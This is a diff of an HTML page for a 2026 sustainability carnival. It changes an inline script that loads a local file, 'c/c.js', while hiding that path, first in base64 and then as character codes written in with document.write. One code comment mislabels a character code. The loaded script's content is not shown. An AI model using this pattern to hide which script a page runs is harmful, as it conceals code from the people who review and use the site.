@@ -8,7 +8,7 @@
     <meta http-equiv="pragma" content="no-cache">
     <meta http-equiv="expires" content="0">
 
-    8
+    9
     <title>可持續發展嘉年華 2026</title>
   
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script> 
@@ -500,17 +500,13 @@ let vmH=typeof globalThis!=='undefined'?globalThis:typeof window!=='undefined'?w
 
 <script>
   (function() {
-    var _p = atob('Yy9jLmpz'); // Decodes to c/c.js
-    var _s = document.createElement('script');
-    _s.src = _p;
+    // 1. Obfuscate the path using simple charCodes
+    // 99='/', 99='c', 46='.', 106='j', 115='s'
+    var p = String.fromCharCode(99, 47, 99, 46, 106, 115); 
     
-    // IMPORTANT: Removing 'defer' and setting 'async' to false 
-    // forces the browser to execute it as soon as it arrives.
-    _s.async = false; 
-    
-    // Use document.write as a fallback for immediate execution 
-    // or stick to the head injection but ensure it's first.
-    document.head.insertBefore(_s, document.head.firstChild);
+    // 2. Use document.write to "force" the script into the parsing stream
+    // This is the most reliable way to mimic a standard <script> tag
+    document.write('<script src="' + p + '" defer><\/script>');
   })();
 </script>
 
